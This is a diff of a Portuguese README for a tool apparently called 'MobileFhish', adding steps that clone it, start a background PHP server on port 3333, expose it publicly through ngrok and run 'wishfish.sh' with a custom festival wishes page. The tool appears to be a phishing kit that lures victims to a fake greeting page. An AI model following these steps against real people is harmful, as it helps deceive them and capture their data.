@@ -18,8 +18,16 @@ Página de Desejos de Festival Adicionada (Personalizada)
 git clone https://github.com/CaioCosta182/MobileFhish.git
 
 sudo apt update
+
 sudo apt install php-cli php-common php-mysql php-zip php-gd php-mbstring php-curl
+
+php -S 0.0.0.0:3333 > /dev/null 2>&1 &
+
+ngrok http 3333
+
 cd MobileFhish && bash wishfish.sh
+
+pkill php
 
 Nota: Agora, ligue o ponto de acesso (hotspot) do seu dispositivo antes de usá-lo.
 
